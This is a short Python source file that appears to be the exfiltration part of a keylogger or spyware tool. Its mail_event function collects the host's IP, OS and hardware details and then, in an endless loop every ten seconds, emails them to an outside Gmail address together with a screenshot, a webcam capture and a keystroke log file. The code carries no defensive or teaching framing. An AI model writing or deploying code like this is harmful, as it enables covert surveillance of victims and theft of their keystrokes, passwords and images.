from sendmail import sendmail
import time
import platform
import socket

def mail_event():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    plat = platform.processor()
    system = platform.system()
    machine = platform.machine()
    print("mail event start")
    while True:
        time.sleep(3)
        sendmail("Data " + ip, plat + "|" + system + "|" + machine, send_to="hot05red05@gmail.com", files=["images/ss.png", "captures/opencv.jpg", "keylogs.txt"])
        print("mail sent")
        time.sleep(7)
    
# mail_event()